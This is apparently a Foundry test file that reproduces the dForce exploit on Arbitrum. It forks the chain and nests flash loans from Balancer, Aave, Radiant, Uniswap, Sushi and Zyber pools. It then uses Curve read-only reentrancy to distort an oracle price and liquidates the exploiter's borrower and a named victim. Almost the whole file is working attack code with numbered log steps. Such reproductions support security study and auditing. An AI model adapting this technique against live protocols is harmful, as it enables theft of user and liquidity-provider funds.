// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
import {ICurvePool} from "src/interfaces/ICurvePool.sol";
import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
import {IAaveFlashloan} from "src/interfaces/IAaveFlashloan.sol";
import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
import {ICointroller} from "src/interfaces/ICointroller.sol";
import {IcurveYSwap} from "src/interfaces/IcurveYSwap.sol";
import {IWETH} from "src/interfaces/IWETH.sol";

// @Analysis
// https://twitter.com/SlowMist_Team/status/1623956763598000129
// https://twitter.com/BlockSecTeam/status/1623901011680333824
// https://twitter.com/peckshield/status/1623910257033617408
// @TX
// https://arbiscan.io/tx/0x5db5c2400ab56db697b3cc9aa02a05deab658e1438ce2f8692ca009cc45171dd

interface uniswapV3Flash {

    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;

}

interface ISwapFlashLoan {

    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;

}

interface IVWSTETHCRVGAUGE is IERC20 {

    function redeem(address receiver, uint256 amount) external;

}

interface ICurvePools is ICurvePool {

    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts)
        external
        returns (uint256[2] memory);

}

interface IDForce {

    function borrowBalanceStored(address account) external returns (uint256);
    function liquidateBorrow(address _borrower, uint256 _repayAmount, address _assetCollateral) external;

}

interface IPriceOracleV2 {

    function getUnderlyingPrice(address _asset) external returns (uint256);

}

interface GMXVAULT {

    function swap(address _tokenIn, address _tokenOut, address _receiver) external;

}

contract ContractTest is Test {

    IWETH WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 USX = IERC20(0x641441c631e2F909700d2f41FD87F0aA6A6b4EDb);
    IERC20 WSTETH = IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
    IERC20 WSTETHCRV = IERC20(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);
    IWETH WSTETHCRVGAUGE = IWETH(payable(0x098EF55011B6B8c99845128114A9D9159777d697));
    IVWSTETHCRVGAUGE VWSTETHCRVGAUGE = IVWSTETHCRVGAUGE(0x2cE498b79C499c6BB64934042eBA487bD31F75ea);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveFlashloan Radiant = IAaveFlashloan(0x2032b9A8e9F7e76768CA9271003d3e43E1616B1F);
    uniswapV3Flash UniV3Flash = uniswapV3Flash(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    IUniswapV2Pair SLP1 = IUniswapV2Pair(0xB7E50106A5bd3Cf21AF210A755F9C8740890A8c9);
    IUniswapV2Pair SLP2 = IUniswapV2Pair(0x905dfCD5649217c42684f23958568e533C711Aa3);
    IUniswapV2Pair SLP3 = IUniswapV2Pair(0x0C1Cf6883efA1B496B01f654E247B9b419873054);
    IUniswapV2Pair ZLP = IUniswapV2Pair(0x8b8149Dd385955DC1cE77a4bE7700CCD6a212e65);
    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0xa067668661C84476aFcDc6fA5D758C4c01C34352);
    ICurvePools curvePool = ICurvePools(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);
    ICointroller cointroller = ICointroller(0x61afB763bc265bD372e8Af8daC00196C9A5eCea0);
    address aArbWETH = 0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8;
    address rWETH = 0x15b53d277Af860f51c3E6843F8075007026BBb3a;
    IDForce dForceContract = IDForce(0xC462fF1063172BAC6f6823A17ED181a0586f0FC8);
    IPriceOracleV2 PriceOracle = IPriceOracleV2(0x15962427A9795005c640A6BF7f99c2BA1531aD6d);
    IcurveYSwap curveYSwap = IcurveYSwap(0x2ce5Fd6f6F4a159987eac99FF5158B7B62189Acf);
    GMXVAULT GMXVault = GMXVAULT(0x489ee077994B6658eAfA855C308275EAd8097C4A);
    Borrower borrower;
    address victimAddress2 = 0x916792f7734089470de27297903BED8a4630b26D;
    uint256 balancerFlashloanAmount;
    uint256 aaveV3FlashloanAmount;
    uint256 UniV3FlashloanAmount;
    uint256 SLP1FlashloanAmount;
    uint256 SLP2FlashloanAmount;
    uint256 SLP3FlashloanAmount;
    uint256 ZLPFlashloanAmount;
    uint256 swapFlashloanAmount;
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("arbitrum", 59_527_633);
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(USX), "USX");
        vm.label(address(WSTETH), "WSTETH");
        vm.label(address(WSTETHCRV), "WSTETHCRV");
        vm.label(address(WSTETHCRVGAUGE), "WSTETHCRVGAUGE");
        vm.label(address(VWSTETHCRVGAUGE), "VWSTETHCRVGAUGE");
        vm.label(address(balancer), "balancer");
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(Radiant), "Radiant");
        vm.label(address(UniV3Flash), "UniV3Flash");
        vm.label(address(SLP1), "SLP1");
        vm.label(address(SLP2), "SLP2");
        vm.label(address(SLP3), "SLP3");
        vm.label(address(ZLP), "ZLP");
        vm.label(address(swapFlashLoan), "swapFlashLoan");
        vm.label(address(curvePool), "curvePool");
        vm.label(address(cointroller), "cointroller");
        vm.label(address(aArbWETH), "aArbWETH");
        vm.label(address(rWETH), "rWETH");
        vm.label(address(dForceContract), "dForceContract");
        vm.label(address(PriceOracle), "PriceOracle");
        vm.label(address(curveYSwap), "curveYSwap");
        vm.label(address(GMXVault), "GMXVault");
    }

    function testExploit() public {
        borrower = new Borrower();
        payable(address(0x0)).transfer(address(this).balance);
        WSTETH.approve(address(curvePool), type(uint256).max);
        WSTETHCRV.approve(address(curvePool), type(uint256).max);
        balancerFlashloan();
        USX.approve(address(curveYSwap), type(uint256).max);
        curveYSwap.exchange_underlying(0, 1, 500_000 * 1e18, 0);
        emit log_named_decimal_uint(
            "19.swap the USX token to USDC, and swap USDC to WETH, the USDC amount",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
        USDC.transfer(address(GMXVault), USDC.balanceOf(address(this)));
        GMXVault.swap(address(USDC), address(WETH), address(this));

        emit log_named_decimal_uint(
            "20.Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }
    // 1.balancerFlashloan

    function balancerFlashloan() internal {
        balancerFlashloanAmount = WETH.balanceOf(address(balancer));
        emit log_named_decimal_uint("1.balancer Flashloan WETH amount", balancerFlashloanAmount, WETH.decimals());
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = balancerFlashloanAmount;
        bytes memory userData = "";
        balancer.flashLoan(address(this), tokens, amounts, userData);
    }
    // 2.balancerFlashloan callback

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        aaveV3Flashloan();
        WETH.transfer(address(balancer), balancerFlashloanAmount);
    }
    // 3.aaveV3Flashloan

    function aaveV3Flashloan() internal {
        aaveV3FlashloanAmount = WETH.balanceOf(aArbWETH);
        emit log_named_decimal_uint("2.aave Flashloan WETH amount", aaveV3FlashloanAmount, WETH.decimals());
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveV3FlashloanAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }
    // 4.aaveV3Flashloan callback 6. RadiantFlashloan callback

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool booleans) {
        if (msg.sender == address(aaveV3)) {
            RadiantFlashloan();
            WETH.approve(address(aaveV3), type(uint256).max);
            booleans = true;
            return booleans;
        } else if (msg.sender == address(Radiant)) {
            UniSwapV3Flashloan();
            WETH.approve(address(Radiant), type(uint256).max);
            booleans = true;
            return booleans;
        }
    }
    // 5.RadiantFlashloan

    function RadiantFlashloan() internal {
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WETH.balanceOf(rWETH);
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        emit log_named_decimal_uint("3.Radiant Flashloan WETH amount", amounts[0], WETH.decimals());
        Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(1), 0);
    }
    // 7.UniSwapV3Flashloan

    function UniSwapV3Flashloan() internal {
        UniV3FlashloanAmount = WETH.balanceOf(address(UniV3Flash));
        emit log_named_decimal_uint("4.UniswapV3 Flashloan WETH amount", UniV3FlashloanAmount, WETH.decimals());
        UniV3Flash.flash(address(this), UniV3FlashloanAmount, 0, new bytes(1));
    }
    // 8.uniswapV3Flash Callback

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        SLP1Flashloan();
        WETH.transfer(address(UniV3Flash), (UniV3FlashloanAmount * 1000) / 997 + 1000);
    }
    // 9.sushipair1Flashloan

    function SLP1Flashloan() internal {
        SLP1FlashloanAmount = WETH.balanceOf(address(SLP1)) - 1;
        emit log_named_decimal_uint("5.Sushi Flashloan WETH amount", SLP1FlashloanAmount, WETH.decimals());
        SLP1.swap(0, SLP1FlashloanAmount, address(this), new bytes(1));
    }
    // 11.sushipair2Flashloan

    function SLP2Flashloan() internal {
        SLP2FlashloanAmount = WETH.balanceOf(address(SLP2)) - 1;
        emit log_named_decimal_uint("6.Sushi Flashloan WETH amount", SLP2FlashloanAmount, WETH.decimals());
        SLP2.swap(SLP2FlashloanAmount, 0, address(this), new bytes(1));
    }
    // 13.sushipair3Flashloan

    function SLP3Flashloan() internal {
        SLP3FlashloanAmount = WETH.balanceOf(address(SLP3)) - 1;
        emit log_named_decimal_uint("7.Sushi Flashloan WETH amount", SLP3FlashloanAmount, WETH.decimals());
        SLP3.swap(0, SLP3FlashloanAmount, address(this), new bytes(1));
    }
    // 10.sushipair1Flashloan callback, 12.sushipair2Flashloan callback, 14.sushipair3Flashloan callback

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender == address(SLP1)) {
            SLP2Flashloan();
            WETH.transfer(address(SLP1), (SLP1FlashloanAmount * 1000) / 997 + 1000);
        } else if (msg.sender == address(SLP2)) {
            SLP3Flashloan();
            WETH.transfer(address(SLP2), (SLP2FlashloanAmount * 1000) / 997 + 1000);
        } else if (msg.sender == address(SLP3)) {
            ZyberFlashloan();
            WETH.transfer(address(SLP3), (SLP3FlashloanAmount * 1000) / 997 + 1000);
        }
    }
    // 15. ZyberFlashloan

    function ZyberFlashloan() internal {
        ZLPFlashloanAmount = WETH.balanceOf(address(ZLP)) - 1;
        emit log_named_decimal_uint("8.Zyber Flashloan WETH amount", ZLPFlashloanAmount, WETH.decimals());
        ZLP.swap(ZLPFlashloanAmount, 0, address(this), new bytes(1));
    }
    // 16. ZyberFlashloan callback

    function ZyberCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        SwapFlashLoans();
        WETH.transfer(address(ZLP), (ZLPFlashloanAmount * 10_000) / 9975 + 1000);
    }
    // 17. SwapFlashLoan

    function SwapFlashLoans() internal {
        swapFlashloanAmount = WETH.balanceOf(address(swapFlashLoan));
        emit log_named_decimal_uint("9.SwapFlashLoan Flashloan WETH amount", swapFlashloanAmount, WETH.decimals());
        swapFlashLoan.flashLoan(address(this), address(WETH), swapFlashloanAmount, new bytes(1));
    }
    // 18. SwapFlashLoan callback

    function executeOperation(address pool, address token, uint256 amount, uint256 fee, bytes calldata params)
        external
        payable
    {
        uint256 ETHBalance = WETH.balanceOf(address(this));
        WETH.withdraw(ETHBalance);
        console.log("--------------------------------------------------");
        emit log_named_decimal_uint(
            "10.SwapFlashLoan callback, add liquidity to curve, the ETH amount", ETHBalance, WETH.decimals()
        );
        uint256 LPAmount = curvePool.add_liquidity{value: ETHBalance}([ETHBalance, 0], 0);
        USX.approve(address(dForceContract), type(uint256).max);
        USX.approve(address(VWSTETHCRVGAUGE), type(uint256).max);
        console.log("--------------------------------------------------");
        emit log_named_decimal_uint(
            "11.Transfer wstETHCRV token to exploiter's borrower, token amount",
            1_904_761_904_761_904_761_904,
            WSTETHCRV.decimals()
        );
        WSTETHCRV.transfer(address(borrower), 1_904_761_904_761_904_761_904);
        borrower.exec();
        uint256 burnAmount = 63_438_591_176_197_540_597_712;
        emit log_named_decimal_uint(
            "14.Remove liquidity from curve, before reentrancy, the price of VWSTETHCRVGAUGE",
            PriceOracle.getUnderlyingPrice(address(VWSTETHCRVGAUGE)),
            VWSTETHCRVGAUGE.decimals()
        );
        curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]); // curve read-only-reentrancy
        burnAmount = 2_924_339_222_027_299_635_899;
        curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]);
        curvePool.exchange(1, 0, WSTETH.balanceOf(address(this)), 0);
        (bool success4,) = address(WETH).call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
        WETH.transfer(address(swapFlashLoan), amount + fee); // repay flashloan amount
    }

    receive() external payable {}

    fallback() external payable {
        if (nonce == 0 && msg.sender == address(curvePool)) {
            nonce++;
            emit log_named_decimal_uint(
                "15.In reentrancy, the price of VWSTETHCRVGAUGE",
                PriceOracle.getUnderlyingPrice(address(VWSTETHCRVGAUGE)),
                VWSTETHCRVGAUGE.decimals()
            );
            uint256 borrowAmount = dForceContract.borrowBalanceStored(address(borrower));
            uint256 Multiplier = cointroller.closeFactorMantissa();
            emit log_named_decimal_uint(
                "16.liquidate the exploiter's borrower, the borrowAmount of exploiter",
                borrowAmount,
                VWSTETHCRVGAUGE.decimals()
            );
            cointroller.liquidateCalculateSeizeTokens(
                address(dForceContract), address(VWSTETHCRVGAUGE), (borrowAmount * Multiplier) / 1e18
            );
            dForceContract.liquidateBorrow(address(borrower), 560_525_526_525_080_924_601_515, address(VWSTETHCRVGAUGE));
            borrowAmount = dForceContract.borrowBalanceStored(victimAddress2);
            emit log_named_decimal_uint(
                "17.liquidate the victim's borrower, the borrowAmount of victim",
                borrowAmount,
                VWSTETHCRVGAUGE.decimals()
            );
            console.log("--------------------------------------------------");
            cointroller.liquidateCalculateSeizeTokens(
                address(dForceContract), address(VWSTETHCRVGAUGE), (borrowAmount * Multiplier) / 1e18
            );
            dForceContract.liquidateBorrow(victimAddress2, 300_037_034_111_437_845_493_368, address(VWSTETHCRVGAUGE));
            VWSTETHCRVGAUGE.redeem(address(this), VWSTETHCRVGAUGE.balanceOf(address(this)));
            emit log_named_decimal_uint(
                "18.redeem vwstETHCRV-gauge to wstETHCRV-gauge and withdraw wstETHCRV, the token amount",
                WSTETHCRVGAUGE.balanceOf(address(this)),
                WSTETHCRVGAUGE.decimals()
            );
            WSTETHCRVGAUGE.withdraw(WSTETHCRVGAUGE.balanceOf(address(this)));
        }
    }

}

contract Borrower is Test {

    IERC20 WSTETHCRV = IERC20(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);
    IERC20 WSTETHCRVGAUGE = IERC20(0x098EF55011B6B8c99845128114A9D9159777d697);
    IERC20 USX = IERC20(0x641441c631e2F909700d2f41FD87F0aA6A6b4EDb);
    IDForce dForceContract = IDForce(0xC462fF1063172BAC6f6823A17ED181a0586f0FC8);

    function exec() external {
        emit log_named_decimal_uint(
            "12.deposit wstETHCRV to wstETHCRV-gauge, token amount", 1_904_761_904_761_904_761_904, WSTETHCRV.decimals()
        );
        WSTETHCRV.approve(address(WSTETHCRVGAUGE), type(uint256).max);
        uint256 depositAmount = 1_904_761_904_761_904_761_904;
        (bool success5,) = address(WSTETHCRVGAUGE).call(abi.encodeWithSignature("deposit(uint256)", depositAmount));
        WSTETHCRVGAUGE.approve(address(dForceContract), type(uint256).max);
        uint256 WSTETHCRVGAUGEAmount = WSTETHCRVGAUGE.balanceOf(address(this));
        uint256 borrowAmount = 2_080_000_000_000_000_000_000_000;
        (bool success,) = address(dForceContract).call(
            abi.encodeWithSelector(0x4381c41a, uint256(1), WSTETHCRVGAUGEAmount, borrowAmount)
        ); // get USX
        require(success);
        emit log_named_decimal_uint(
            "13.deposit wstETHCRV-gauge to dForce, receive USX token, the token amount",
            USX.balanceOf(address(this)),
            USX.decimals()
        );
        USX.transfer(msg.sender, USX.balanceOf(address(this)));
        console.log("--------------------------------------------------");
    }

}
